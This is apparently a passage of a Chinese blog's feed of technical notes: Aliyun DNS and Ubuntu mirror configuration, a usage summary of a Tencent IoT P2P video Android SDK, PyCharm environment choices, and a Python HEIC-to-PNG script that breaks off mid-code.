<h3 id="2-旧配置"><a href="#2-旧配置" class="headerlink" title="2. 旧配置"></a>2. 旧配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/network/interfaces</span><br><span class="line">dns-nameserver 223.5.5.5</span><br><span class="line">dns-nameserver 223.6.6.6</span><br></pre></td></tr></table></figure>
<p>这是Ubuntu16.04的配置方法，升级后，还是可以生效，但这里的设置，也是将nameserver写入到 <code>/run/resolvconf/resolv.conf</code> 文件。<br><code>223.6.6.6</code> 或者 <code>8.8.8.8</code> 这些外部的DNS是无法识别阿里内部的域名的，比如sources.list中的 <code>http://mirrors.cloud.aliyuncs.com/ubuntu</code>。</p>
<h3 id="3-推荐"><a href="#3-推荐" class="headerlink" title="3. 推荐"></a>3. 推荐</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /run/resolvconf/resolv.conf</span><br><span class="line"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="line">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="line"># 127.0.0.53 is the systemd-resolved stub resolver.</span><br><span class="line"># run &quot;systemd-resolve --status&quot; to see details about the actual nameservers.</span><br><span class="line">nameserver 127.0.0.53</span><br><span class="line">options timeout:2 attempts:3 rotate single-request-reopen</span><br></pre></td></tr></table></figure>
<p>阿里云ECS用 <code>127.0.0.53</code> 是比较推荐的，应该是它内部的DNS服务。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>阿里云</tag>
      </tags>
  </entry>
  <entry>
    <title>XX物联网智能视频服务（消费版）2.0 Android SDK使用总结</title>
    <url>/P2P/%E8%85%BE%E8%AE%AF%E4%BA%91%E7%89%A9%E8%81%94%E7%BD%91%E6%99%BA%E8%83%BD%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1%EF%BC%88%E6%B6%88%E8%B4%B9%E7%89%88%EF%BC%892.0%20Android%20SDK%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<blockquote>
<p>SDK 1.0 和 2.0 差别挺大的，目前SDK 2.3.0是最新版本</p>
</blockquote>
<h2 id="一、资源文档"><a href="#一、资源文档" class="headerlink" title="一、资源文档"></a>一、资源文档</h2><h3 id="1-Github开源资源"><a href="#1-Github开源资源" class="headerlink" title="1. Github开源资源"></a>1. Github开源资源</h3><ul>
<li><a href="https://github.com/tencentyun/iot-link-android" target="_blank" rel="noopener">项目Github仓库</a></li>
<li><a href="https://github.com/tencentyun/iot-link-android/blob/master/sdk/video-link-android/doc/VideoSDK接入说明.md" target="_blank" rel="noopener">VideoSDK接入说明</a></li>
<li><a href="https://github.com/tencentyun/iot-link-android/blob/master/sdk/video-link-android/doc/VideoSDK接口说明.md" target="_blank" rel="noopener">VideoSDK接口说明</a></li>
<li><a href="https://github.com/tencentyun/iot-link-android/blob/master/sdk/video-link-android/doc/设备与APP交互指引.md" target="_blank" rel="noopener">设备与APP交互指引</a></li>
<li><a href="https://github.com/tencentyun/iot-link-android/blob/master/sdk/video-link-android/doc/设备配网.md" target="_blank" rel="noopener">设备配网</a></li>
<li><a href="https://github.com/tencentyun/iot-link-android/blob/master/sdk/video-link-android/doc/VideoSDK错误码及常见问题说明.md" target="_blank" rel="noopener">VideoSDK错误码及常见问题说明</a></li>
</ul>
<h3 id="2-官网资源"><a href="#2-官网资源" class="headerlink" title="2. 官网资源"></a>2. 官网资源</h3><ul>
<li><a href="https://cloud.tencent.com/document/product/1131/53390" target="_blank" rel="noopener">官网文档</a></li>
<li><a href="https://cloud.tencent.com/document/product/1131/54990" target="_blank" rel="noopener">IoT Video Demo体验指南</a></li>
<li><a href="https://cloud.tencent.com/document/product/1131/54991" target="_blank" rel="noopener">云存接入指南</a></li>
<li><a href="https://cloud.tencent.com/document/product/1131/61744" target="_blank" rel="noopener">设备端与应用端信令交互说明</a></li>
</ul>
<blockquote>
<p>其实这部分的资料也是在Github上的，Github上的资源会比较新。  </p>
</blockquote>
<h2 id="二、-SDK函数"><a href="#二、-SDK函数" class="headerlink" title="二、 SDK函数"></a>二、 SDK函数</h2><p>这是SDK 2.3.0所有的接口<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">setCallback</span><span class="params">(XP2PCallback callback)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">setQcloudApiCred</span><span class="params">(String id, String key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span>  <span class="keyword">int</span> <span class="title">startServiceWithXp2pInfo</span><span class="params">(String id, String product_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                       String device_name, String xp2p_info)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">delegateHttpFlv</span><span class="params">(String id)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">setStunServerToXp2p</span><span class="params">(String server, <span class="keyword">int</span> port)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">runSendService</span><span class="params">(String id, String cmd, <span class="keyword">boolean</span> crypto)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">stopSendService</span><span class="params">(String id, <span class="keyword">byte</span>[] data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">dataSend</span><span class="params">(String id, <span class="keyword">byte</span>[] data, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getCommand是废弃的接口</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">getCommandRequestWithSync</span><span class="params">(String id, String cmd, <span class="keyword">long</span> timeout)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">getCommandRequestWithAsync</span><span class="params">(String id, String cmd)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">postCommandRequestSync</span><span class="params">(String id, <span class="keyword">byte</span>[] command, <span class="keyword">long</span> cmd_len, <span class="keyword">long</span> timeout_us)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">postCommandRequestWithAsync</span><span class="params">(String id, <span class="keyword">byte</span>[] command, <span class="keyword">long</span> cmd_len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向camera设备请求媒体流,异步回调方式，和 delegateHttpFlv() 的使用互斥</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">startAvRecvService</span><span class="params">(String id, String cmd, <span class="keyword">boolean</span> crypto)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">stopAvRecvService</span><span class="params">(String id, <span class="keyword">byte</span>[] data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">stopService</span><span class="params">(String id)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>SDK函数调用顺序：</p>
<ul>
<li>setQcloudApiCred：设置密钥</li>
<li>setCallback：回调</li>
<li>startServiceWithXp2pInfo：初始化P2P连接</li>
<li>runSendService:如果没有发送需求可不调用该接口</li>
<li>dataSend:如果没有发送需求可不调用该接口</li>
<li>stopSendService:该接口暂时不用调用</li>
<li>stopService</li>
</ul>
<h2 id="三、P2P连接"><a href="#三、P2P连接" class="headerlink" title="三、P2P连接"></a>三、P2P连接</h2><h3 id="1-通过密钥连接"><a href="#1-通过密钥连接" class="headerlink" title="1.通过密钥连接"></a>1.通过密钥连接</h3><ul>
<li>setQcloudApiCred(“xxx”,”xxx”)</li>
<li>setCallback(this)</li>
<li>startServiceWithXp2pInfo(id, productId, deviceName, “”)</li>
</ul>
<p>这就是官方sdkdemo里面连接设备的核心函数，其中setQcloudApiCred的两个参数就是demo登录时填的密钥<code>secretId</code>和<code>secretKey</code>。<br>这种方式做调试方便，但同时权限也是非常高，在正式App中使用不合适。</p>
<h3 id="2-通过xp2p-info连接-采用此方式"><a href="#2-通过xp2p-info连接-采用此方式" class="headerlink" title="2.通过xp2p_info连接 (采用此方式)"></a>2.通过xp2p_info连接 (采用此方式)</h3><ul>
<li>setCallback(this)</li>
<li>startServiceWithXp2pInfo(id, productId, deviceName, “xxx”)</li>
</ul>
<p>xp2p_info这个参数在设备上线时上传给SDK服务器，我们自建后台可以通过云API获取到。<br>初始化P2P连接时，给startServiceWithXp2pInfo()传入xp2p_info参数即可连接设备。</p>
<blockquote>
<p>官网文档摘录：<br>SDK需要的xp2p info需要App侧从自己的业务后台获取；<br>获取到xp2p info后，可以通过上述的<code>startServiceWithXp2pInfo</code>接口将该info传给SDK，示例代码如下：<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;   String xp2p_info = getXP2PInfo(...) // 从自建后台获取xp2p info</span><br><span class="line">&gt;   XP2P.setCallback(this)</span><br><span class="line">&gt;   XP2P.startServiceWithXp2pInfo(id, product_id, device_name, xp2p_info)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="四、播放音视频"><a href="#四、播放音视频" class="headerlink" title="四、播放音视频"></a>四、播放音视频</h2><p>在连接上P2P的前提下，连接音视频也非常简单：</p>
<ul>
<li>val flv_url = XP2P.delegateHttpFlv(id)</li>
<li>使用ijkPlayer播放 flv_url</li>
</ul>
<blockquote>
<p>注意：如果P2P没有连接上，这里获取的flv_url为null</p>
</blockquote>
<p>我分析这是将设备端的音视频封装为FLV格式，ijkPlayer本身是支持这些格式的，再经过自己魔改一<br>下ijkPlayer使得它支持P2P传输，所以App开发者也不需要自己解码了，给ijkPlayer配一个TextureView就能播放了。</p>
<h2 id="五、说话、发送声音"><a href="#五、说话、发送声音" class="headerlink" title="五、说话、发送声音"></a>五、说话、发送声音</h2><p>步骤：</p>
<ul>
<li><code>XP2P.postCommandRequestSync()</code> 发送信令检查设备的状态（是否允许语音通话）</li>
<li><code>XP2P.runSendService()</code> 启动服务</li>
<li>录音PCM，PCM编码ACC，ACC封装为FLV</li>
<li><code>XP2P.dataSend()</code> 发送FLV数据</li>
<li><code>XP2P.stopSendService()</code> 停止服务</li>
</ul>
<blockquote>
<p>注意：语音编码可以采用其他如G711A、PCM，但必须封装为FLV，否则不能发送。</p>
</blockquote>
<p>FLV格式请参考<a href="../../音视频/FLV封装格式解析">【FLV封装格式解析】</a></p>
<h2 id="六、云台信令"><a href="#六、云台信令" class="headerlink" title="六、云台信令"></a>六、云台信令</h2><ul>
<li><code>postCommandRequestSync</code> 发送信令</li>
</ul>
<p>信令内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">控制ipc左移:action=user_define&amp;channel=xxx&amp;cmd=ptz_left</span><br><span class="line">控制ipc右移:action=user_define&amp;channel=xxx&amp;cmd=ptz_right</span><br><span class="line">控制ipc上移:action=user_define&amp;channel=xxx&amp;cmd=ptz_up</span><br><span class="line">控制ipc下移:action=user_define&amp;channel=xxx&amp;cmd=ptz_down</span><br></pre></td></tr></table></figure></p>
<h2 id="七、自定义信令交互"><a href="#七、自定义信令交互" class="headerlink" title="七、自定义信令交互"></a>七、自定义信令交互</h2><ul>
<li><code>postCommandRequestSync</code> 发送信令</li>
</ul>
<p>格式： <code>action=user_define&amp;channel=xxx&amp;cmd=xxx</code></p>
<p>自定义数据必须跟在 <code>cmd=xxx</code> 后面</p>
<h2 id="八、回放"><a href="#八、回放" class="headerlink" title="八、回放"></a>八、回放</h2><h3 id="1-本地回放"><a href="#1-本地回放" class="headerlink" title="1.本地回放"></a>1.本地回放</h3><ul>
<li><code>postCommandRequestSync</code> 用查询录像（<code>action=inner_define&amp;channel=0&amp;cmd=get_record_index&amp;start_time=000&amp;end_time=111</code>）</li>
<li>ijkplayer点播（<code>ipc.flv?action=playback&amp;channel=xxx&amp;start_time=xxx&amp;end_time=yyy</code>）</li>
<li>暂停回放、继续回放</li>
<li>录像进度条滑动</li>
</ul>
<h3 id="2-云回放"><a href="#2-云回放" class="headerlink" title="2.云回放"></a>2.云回放</h3><ul>
<li>云API查询录像</li>
<li>获取m3u8 URL</li>
<li>ijkplayer点播</li>
</ul>
]]></content>
      <categories>
        <category>p2p</category>
      </categories>
  </entry>
  <entry>
    <title>Python创建项目</title>
    <url>/Python/PyCharm%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>PyCharm创建项目有几种选择，这里记录一下。</p>
<h3 id="1-Previously-configured-interpereter"><a href="#1-Previously-configured-interpereter" class="headerlink" title="1. Previously configured interpereter"></a>1. Previously configured interpereter</h3><p><img src="/images/python/pycharm1.png" alt><br>这是使用系统安装的Python的环境，pip依赖也是安装在系统的。<br>优点：使用现成的环境，方便快捷。特别是依赖，只要系统中使用过的库，无需重新下载安装。<br>缺点：各个项目的Python版本可能不一样，会和系统的Python版本冲突。</p>
<h3 id="2-Virtualenv"><a href="#2-Virtualenv" class="headerlink" title="2. Virtualenv"></a>2. Virtualenv</h3><p><img src="/images/python/pycharm2.png" alt><br>Virtualenv虚拟环境为项目提供隔离的Python，解决了不同应用间多版本的冲突问题。这是在项目根目录下有一个venv目录，里面下载了你选择的Python版本，默认会安装 <code>pip</code> 和 <code>setuptools</code>。<br>优点：不会有多版本的冲突问题。<br>缺点：项目中的虚拟环境存在一个Python版本，依赖也是安装在虚拟环境下，耗时更加长。要手动安装依赖。</p>
<blockquote>
<p>通过 <code>pip freeze</code> 生成 <code>requirements.txt</code> 文件<br>然后通过 <code>pip install -r requirements.txt</code> 安装<br>依赖更新需重新生成依赖。</p>
</blockquote>
<h3 id="3-Pipenv"><a href="#3-Pipenv" class="headerlink" title="3. Pipenv"></a>3. Pipenv</h3><p><img src="/images/python/pycharm3.png" alt><br>pipenv是代替vitualenv的工具，集成度、易用性更高，需要独立安装： <code>pip install pipenv</code>，上图的系统Python环境没有安装pipenv。</p>
<blockquote>
<p>Pipenv 引入两个包管理文件文件 <code>Pipfile、Pipfile.lock</code> 解决这个问题，它会自动安装依赖。</p>
</blockquote>
<p>Pycharm创建的Pipenv项目，本地已有pipenv环境。<br><img src="/images/python/pipenv_create_project.png" alt></p>
<p>项目的结构是：<br><img src="/images/python/pipenv_项目结构.png" alt></p>
<figure class="highlight profile"><table><tr><td class="code"><pre><span class="line">[[source]]</span><br><span class="line">url = <span class="string">"https://pypi.org/simple"</span></span><br><span class="line">verify_ssl = true</span><br><span class="line">name = <span class="string">"pypi"</span></span><br><span class="line"></span><br><span class="line">[packages]</span><br><span class="line"></span><br><span class="line">[dev-packages]</span><br><span class="line"></span><br><span class="line">[requires]</span><br><span class="line">python_version = <span class="string">"3.7"</span></span><br></pre></td></tr></table></figure>
<p>虚拟环境的路径是统一在user目录下：<br><img src="/images/python/pipenv_虚拟环境.png" alt></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云开源软件镜像</title>
    <url>/Linux/%E9%98%BF%E9%87%8C%E4%BA%91%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<p><a href="https://opsx.alibaba.com/" target="_blank" rel="noopener">【阿里云开源软件镜像】</a></p>
<p>阿里巴巴开源镜像站由阿里系统服务团队开发并支持，主旨在于服务阿里云客户，并在此基础上为互联网用户提供支持。 目前提供 Debian、Ubuntu、 Fedora、Arch Linux、 CentOS、openSUSE、Scientific Linux、Gentoo 等多个发行版的软件安装源和ISO下载服务，我们竭力为互联网用户提供全面，高效和稳定的软件服务。</p>
<h3 id="域名解析DNS"><a href="#域名解析DNS" class="headerlink" title="域名解析DNS"></a>域名解析DNS</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">223.5.5.5</span><br><span class="line">223.6.6.6</span><br></pre></td></tr></table></figure>
<h3 id="ubuntu-18-04"><a href="#ubuntu-18-04" class="headerlink" title="ubuntu 18.04"></a>ubuntu 18.04</h3><p>对于阿里云ECS用户，可以直接使用内部域名访问，而对于非云用户则需要使用公网域名 mirrors.aliyun.com 来访问。</p>
<ol>
<li>图形界面配置</li>
</ol>
<p>新手推荐使用图形界面配置： 系统设置 -&gt; 软件和更新 选择下载服务器 -&gt; “mirrors.aliyun.com”</p>
<ol start="2">
<li>手动更改<br>创建自己的配置文件<code>/etc/apt/sources.list.d/aliyun.list</code>，内容：<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>2022-01-21 拷贝阿里云主机默认的source.list，域名是 <code>mirrors.cloud.aliyuncs.com</code>，这是ECS内部的软件源。<br>注意： DNS要用 <code>127.0.0.53</code>，不用修改就好。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Note, this file is written by cloud-init on first boot of an instance</span><br><span class="line">## modifications made here will not survive a re-bundle.</span><br><span class="line">## if you wish to make changes you can:</span><br><span class="line">## a.) add &apos;apt_preserve_sources_list: true&apos; to /etc/cloud/cloud.cfg</span><br><span class="line">##     or do the same in user-data</span><br><span class="line">## b.) add sources in /etc/apt/sources.list.d</span><br><span class="line">## c.) make changes to template file /etc/cloud/templates/sources.list.tmpl</span><br><span class="line"></span><br><span class="line"># See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to</span><br><span class="line"># newer versions of the distribution.</span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic main</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic main</span><br><span class="line"></span><br><span class="line">## Major bug fix updates produced after the final release of the</span><br><span class="line">## distribution.</span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates main</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates main</span><br><span class="line"></span><br><span class="line">## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span><br><span class="line">## team. Also, please note that software in universe WILL NOT receive any</span><br><span class="line">## review or updates from the Ubuntu security team.</span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic universe</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic universe</span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates universe</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates universe</span><br><span class="line"></span><br><span class="line">## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span><br><span class="line">## team, and may not be under a free licence. Please satisfy yourself as to</span><br><span class="line">## your rights to use the software. Also, please note that software in</span><br><span class="line">## multiverse WILL NOT receive any review or updates from the Ubuntu</span><br><span class="line">## security team.</span><br><span class="line"># deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic multiverse</span><br><span class="line"># deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic multiverse</span><br><span class="line"># deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates multiverse</span><br><span class="line"># deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates multiverse</span><br><span class="line"></span><br><span class="line">## Uncomment the following two lines to add software from the &apos;backports&apos;</span><br><span class="line">## repository.</span><br><span class="line">## N.B. software from this repository may not have been tested as</span><br><span class="line">## extensively as that contained in the main release, although it includes</span><br><span class="line">## newer versions of some applications which may provide useful features.</span><br><span class="line">## Also, please note that software in backports WILL NOT receive any review</span><br><span class="line">## or updates from the Ubuntu security team.</span><br><span class="line"># deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"># deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">## Uncomment the following two lines to add software from Canonical&apos;s</span><br><span class="line">## &apos;partner&apos; repository.</span><br><span class="line">## This software is not part of Ubuntu, but is offered by Canonical and the</span><br><span class="line">## respective vendors as a service to Ubuntu users.</span><br><span class="line"># deb http://archive.canonical.com/ubuntu bionic partner</span><br><span class="line"># deb-src http://archive.canonical.com/ubuntu bionic partner</span><br><span class="line"></span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security main</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security main</span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security universe</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security universe</span><br><span class="line"># deb http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security multiverse</span><br><span class="line"># deb-src http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security multiverse</span><br></pre></td></tr></table></figure></p>
<p>去掉注释就是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic main</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic main</span><br><span class="line"></span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates main</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates main</span><br><span class="line"></span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic universe</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic universe</span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates universe</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates universe</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu/ bionic-updates multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security main</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security main</span><br><span class="line">deb http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security universe</span><br><span class="line">deb-src http://mirrors.cloud.aliyuncs.com/ubuntu bionic-security universe</span><br></pre></td></tr></table></figure></p>
<h3 id="ubuntu-20-04"><a href="#ubuntu-20-04" class="headerlink" title="ubuntu 20.04"></a>ubuntu 20.04</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>阿里云,镜像站,开源软件</tag>
      </tags>
  </entry>
  <entry>
    <title>Python批量转换HEIC图片为PNG</title>
    <url>/Python/Python%E6%89%B9%E9%87%8F%E8%BD%AC%E6%8D%A2HEIC%E5%9B%BE%E7%89%87%E4%B8%BAPNG/</url>
    <content><![CDATA[<p>苹果设备现在拍照的文件都是 <code>.heic</code> 格式，文件占的存储空间确实更小了，但导出到Windows查看，打开图片所在文件夹就被会卡到不行，为了方便整理图片，可以考虑将图片批量转为 <code>png</code>、<code>jpg</code>等格式。<br>网上很多网站提供在线转换，这对于大量图片来说肯定不适用，而且个人图片还存在隐私问题，所以考虑用Python来做这个事情。</p>
<h3 id="一、格式详解"><a href="#一、格式详解" class="headerlink" title="一、格式详解"></a>一、格式详解</h3><p><code>HEIF</code> 和 <code>HEIC</code> 的介绍请看这篇文章：<a href="https://zhuanlan.zhihu.com/p/35847861" target="_blank" rel="noopener">【HEIF/heic图片文件解析】</a><br>简单来说，<code>HEIF</code> 是一个容器的图片格式，当前包含的编码 <code>HEVC</code>(256) 和 <code>H.264/MPEG-4 AVC</code>。<br>在苹果设备采用的<code>HEIC</code>就是 <code>HEIF</code>采用 <code>HEVC</code>编码的一种，文件后缀为 <code>*.heic</code> 。</p>
<h3 id="二、库"><a href="#二、库" class="headerlink" title="二、库"></a>二、库</h3><p>如果想自己去提取<code>HEIF</code>文件中的图片，一定会使用到诺基亚的C++库<a href="https://github.com/nokiatech/heif" target="_blank" rel="noopener">【nokiatech/heif】</a>，我们用Python也是要用到这个库，但我们不直接安装这个库。</p>
<blockquote>
<p><code>pyheif</code> 这个库不能通过 <code>pip install pyheif</code> 来安装，提示说要C++编译环境。</p>
</blockquote>
<p>可以通过下载whl文件，然后本地安装<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyheif" target="_blank" rel="noopener">pyheif依赖库下载</a><br>我当前的环境是 Win10 + Python3.7 ，所以下载<a href="https://download.lfd.uci.edu/pythonlibs/x6hvwk7i/pyheif-0.6.1-cp37-cp37m-win_amd64.whl" target="_blank" rel="noopener">【pyheif‑0.6.1‑cp37‑cp37m‑win_amd64.whl】</a></p>
<h3 id="三、安装依赖"><a href="#三、安装依赖" class="headerlink" title="三、安装依赖"></a>三、安装依赖</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install pyheif‑0.6.1‑cp37‑cp37m‑win_amd64.whl</span><br><span class="line">pip3 install Pillow</span><br></pre></td></tr></table></figure>
<h3 id="四、代码"><a href="#四、代码" class="headerlink" title="四、代码"></a>四、代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyheif</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只遍历一级目录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dir_heic_files</span><span class="params">(source_path)</span>:</span></span><br><span class="line">    filelist = []</span><br><span class="line">    fileList = os.listdir(source_path)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> fileList:</span><br><span class="line">        <span class="keyword">if</span>(file.find(<span class="string">'.heic'</span>) &gt; <span class="number">0</span>):</span><br><span class="line">            names = file.split(<span class="string">"."</span>)</span><br><span class="line">            filelist.append(&#123;</span><br><span class="line">                    <span class="string">"filename"</span>: names[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">"filepath"</span>: os.path.join(source_path, file)</span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heic2Png</span><span class="params">(src_path,target_path)</span>:</span></span><br><span class="line">    print(src_path,<span class="string">'-&gt;'</span>,target_path)</span><br><span class="line">    img_heic = pyheif.read(src_path)</span><br><span class="line">    img_heic_bytes = Image.frombytes(mode=img_heic.mode, size=img_heic.size, data=img_heic.data)</span><br><span class="line">    <span class="comment"># img_heic_bytes.save(target_path, format="jpg")</span></span><br><span class="line">    img_heic_bytes.save(target_path, format=<span class="string">"png"</span>) </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> 